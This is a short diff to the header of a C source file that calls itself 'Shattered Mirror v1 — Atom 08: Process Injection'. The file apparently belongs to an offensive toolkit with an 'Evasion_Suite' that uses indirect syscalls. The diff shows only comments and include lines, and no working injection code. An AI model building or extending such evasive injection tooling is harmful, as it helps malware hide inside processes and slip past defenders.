@@ -1,4 +1,4 @@
-﻿/*=============================================================================
+/*=============================================================================
  * Shattered Mirror v1 — Atom 08: Process Injection
  *
  * Section-Based Map/View Injection Implementation.
@@ -13,7 +13,6 @@
  *===========================================================================*/
 
 #include "Atom_08_Proc.h"
-#include "Atom_03_Sys.h" /* Syscall Linker */
 #include "../Orchestrator/AtomManager.h"
 #include "../Evasion_Suite/include/indirect_syscall.h"
 #include "../Evasion_Suite/include/common.h"
